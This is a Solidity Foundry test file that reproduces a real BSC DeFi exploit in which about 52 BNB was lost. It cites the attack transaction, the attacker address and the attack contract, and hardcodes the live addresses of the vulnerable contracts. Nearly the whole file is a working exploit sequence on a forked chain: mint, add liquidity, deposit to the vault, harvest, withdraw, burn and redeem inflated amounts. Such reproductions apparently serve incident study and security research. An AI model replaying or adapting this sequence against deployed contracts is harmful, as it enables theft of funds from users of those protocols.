// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo -- Total Lost : ~52 BNB
// TX : https://app.blocksec.com/explorer/tx/bsc/0xbac614f4d103939a9611ca35f4ec9451e1e98512d573c822fbff70fafdbbb5a0
// Attacker : https://bscscan.com/address/0x4ced363484dfebd0fab1b33c3eca0edca44a346c
// Attack Contract : https://bscscan.com/address/0x00db72390c1843de815ef635ee58ac19b54af4ef
// GUY : https://x.com/0xNickLFranklin/status/1802634237667054052

interface Vulncontract is IERC20 {
    struct MintParams {
            address asset;   // USDC | BUSD depends at chain
            uint256 amount;  // amount asset
            string referral; // code from Referral Program -> if not have -> set empty
        }
    function mint(MintParams calldata params) external  returns (uint256);
    function harvest() external;
    function redeem(address _asset, uint256 _amount) external   returns (uint256) ;
}
interface StableV1AMM is IERC20{

      function mint(address to) external returns (uint liquidity);
    function burn(address to) external  returns (uint amount0, uint amount1) ;
}
interface DysonVault is IERC20{

      function depositAll() external ;
      function withdrawAll() external;
}
contract ContractTest is Test {
    //b708
    Vulncontract b708 = Vulncontract(0xd3F827C0b1D224aeBCD69c449602bBCb427Cb708);
    //b821
    Vulncontract b821 = Vulncontract(0x5A8EEe279096052588DfCc4e8b466180490DB821);
    //b296
    Vulncontract b29b = Vulncontract(0x2b9BDa587ee04fe51C5431709afbafB295F94bB4);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    WBNB constant WBNB_TOKEN = WBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 Usdt=IERC20(0x5335E87930b410b8C5BB4D43c3360ACa15ec0C8C);
    IERC20 USDC = IERC20(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);
    IERC20 USDPLUS = IERC20(0xe80772Eaf6e2E18B651F160Bc9158b2A5caFCA65);
    StableV1AMM StableV1= StableV1AMM(0x1561D9618dB2Dcfe954f5D51f4381fa99C8E5689);
    DysonVault dysonVault= DysonVault(0x2836B64a39d5B73d8f534c9fd6c6ABD81df2beB7);
    address referrals=0xACC3b446A16c809235860ab6d4ec95b5F018aA0b;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    function setUp() public {
        cheats.createSelectFork("bsc", 39684702);
        deal(address(USDT),address(this),910 ether);
        deal(address(USDC),address(this),910 ether);
    }

    function testExploit() public {
        USDT.approve(address(Router), type(uint256).max);
        attack();
        emit log_named_decimal_uint("[End] Attacker USDT balance after exploit", USDT.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[End] Attacker USDC balance after exploit", USDC.balanceOf(address(this)), 18);
    }

    function attack() public {
        approveAll();
        // WBNB_TOKEN.deposit{value: 1.5 ether}();
        Vulncontract.MintParams memory param=Vulncontract.MintParams({
            asset:address(USDC),
            amount:901 ether,
            referral:string("test")
        });
        b821.mint(param);
        Vulncontract.MintParams memory params=Vulncontract.MintParams({
            asset:address(USDT),
            amount:901 ether,
            referral:string("test")
        });
        b708.mint(params);

        Usdt.transfer(address(StableV1),748 ether);
        USDPLUS.transfer(address(StableV1),900639600);

        StableV1.mint(address(this));
        dysonVault.depositAll();

        b29b.harvest();

        dysonVault.withdrawAll();

        uint256 amounts=StableV1.balanceOf(address(this));
        StableV1.transfer(address(StableV1),amounts);
        StableV1.burn(address(this));
        b708.redeem(address(USDT),15000 ether);
        b821.redeem(address(USDC),18000 * 1e6);


    }

   function approveAll() internal {
        USDT.approve(address(b708), type(uint256).max);
        Usdt.approve(address(b708), type(uint256).max);
        USDC.approve(address(b821),type(uint256).max);
        USDPLUS.approve(address(b821),type(uint256).max);
        StableV1.approve(address(dysonVault),type(uint256).max);
    }

}
